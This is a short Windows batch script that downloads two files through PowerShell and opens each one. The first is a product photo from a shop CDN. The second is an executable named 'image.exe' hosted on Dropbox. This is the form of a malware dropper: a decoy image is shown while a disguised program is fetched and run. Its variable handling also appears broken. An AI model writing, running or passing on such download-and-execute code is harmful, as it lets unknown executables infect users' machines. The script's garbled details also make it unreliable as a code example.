@echo off

set files='https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg','https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0'

for %%i in (%files%) do (
	set fileName="'%%i'+(Split-Path -Path $_ -Leaf)"
	powershell "(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;"
)

